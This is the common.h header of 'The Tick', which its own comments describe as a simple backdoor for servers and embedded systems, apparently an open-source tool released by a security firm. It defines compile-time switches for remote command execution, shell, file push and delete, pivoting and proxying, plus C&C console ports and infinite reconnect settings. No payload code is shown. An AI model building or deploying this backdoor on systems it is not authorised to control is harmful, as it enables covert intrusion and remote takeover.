/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef COMMON_H
#define COMMON_H

/*****************************************************************************/

// The following macros can be redefined with -D at the makefile level.
// They allow fine grained control on what features and settings to use at
// compile time. Removing features can be useful for embedded systems where
// you have limited memory and resources, but it can also be practical if you
// want to intentionally limit the functionality - for example, having a bot
// that can work as a proxy but doesn't grant any access to the host; or
// hardcoding connection parameters in the binary for situations where you
// have limited control over how the bot gets executed.

// Log to standard output. Use 1 to enable, 0 to disable.
#ifndef TICK_VERBOSE
#define TICK_VERBOSE 1
#endif

// Feature control. Use 1 to enable, 0 to disable.
#ifndef TICK_FEATURES_CRYPTO
#define TICK_FEATURES_CRYPTO    1   /* protocol encryption */
#endif
#ifndef TICK_FEATURES_DNS
#define TICK_FEATURES_DNS       1   /* DNS resolution (globally) */
#endif
#ifndef TICK_FEATURES_EXEC
#define TICK_FEATURES_EXEC      1   /* exec command */
#endif
#ifndef TICK_FEATURES_FILE
#define TICK_FEATURES_FILE      1   /* push, pop, rm and chmod commands */
#endif
#ifndef TICK_FEATURES_SHELL
#define TICK_FEATURES_SHELL     1   /* shell command */
#endif
#ifndef TICK_FEATURES_PIVOT
#define TICK_FEATURES_PIVOT     1   /* pivot and proxy commands */
#endif

// Configuration sources control. Use 1 to enable, 0 to disable.
// Ordered by precedence - the previous ones override the later ones.
#ifndef TICK_CONFIG_USE_ARGV
#define TICK_CONFIG_USE_ARGV    1   /* parse the command line */
#endif
#ifndef TICK_CONFIG_USE_ENV
#define TICK_CONFIG_USE_ENV     1   /* use environment variables */
#endif
#ifndef TICK_CONFIG_USE_FILE
#define TICK_CONFIG_USE_FILE    1   /* parse configuration file */
#endif
#ifndef TICK_CONFIG_USE_BIN
#define TICK_CONFIG_USE_BIN     1   /* config file appended to binary */
#endif

// Default configuration values. These are overridden in runtime.
//#ifndef TICK_CONFIG_HOSTNAME
//#define TICK_CONFIG_HOSTNAME 127.0.0.1
//#endif
#ifndef TICK_CONFIG_PORT
#define TICK_CONFIG_PORT 5555
#endif
#ifndef TICK_CONFIG_USE_SSL
#define TICK_CONFIG_USE_SSL 1   /* 1 to enable, 0 to disable */
#endif
#ifndef TICK_CONFIG_SSL_PORT
#define TICK_CONFIG_SSL_PORT 6666
#endif

// If connection to the C&C console fails, configure how many times to
// retry, and how long to wait (in seconds) between attempts.
#ifndef TICK_CONNECT_RETRY_TIMES
#define TICK_CONNECT_RETRY_TIMES -1     /* -1 for infinite */
#endif
#ifndef TICK_CONNECT_RETRY_PAUSE
#define TICK_CONNECT_RETRY_PAUSE 30
#endif

// Buffer size for the parser.
// We keep a fixed buffer size to ensure memory consumption is more or less
// fixed. This is especially important on embedded systems. Do not let it
// exceed one memory page or it may cause stack overrun problems.
// TODO: consider using static memory instead
#ifndef TICK_PARSER_BUFFER_SIZE
#define TICK_PARSER_BUFFER_SIZE 1024
#endif

// Buffer size for the response of the "exec" command.
// We keep a fixed buffer size to ensure memory consumption is more or less
// fixed. This is especially important on embedded systems. Do not let it
// exceed one memory page or it may cause stack overrun problems.
// TODO: consider using static memory instead
#ifndef TICK_EXEC_BUFFER_SIZE
#define TICK_EXEC_BUFFER_SIZE 4096
#endif

/*****************************************************************************/

#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>

#ifdef _WIN32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winbase.h>
#include <fileapi.h>
#include <processthreadsapi.h>
#include <minwindef.h>
#include <synchapi.h>
#include <namedpipeapi.h>

// https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo#support-for-getaddrinfo-on-windows-2000-and-older-versions
#include <wspiapi.h>

#define O_SYNC 0

#define SHUT_RD SD_RECEIVE
#define SHUT_WR SD_SEND
#define SHUT_RDWR SD_BOTH

#define MIN min
#define MAX max

#else

#include <netdb.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/statvfs.h>

#define O_BINARY 0
#define O_SEQUENTIAL 0

#endif

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

/*****************************************************************************/

// Log function. Wraps on printf, when disabled at compile time it's effectively a no-op.
#if TICK_VERBOSE
#include <stdio.h>
#define LOG(...) printf(__VA_ARGS__)
#else
#define LOG(...)
#endif

#endif /* COMMON_H */
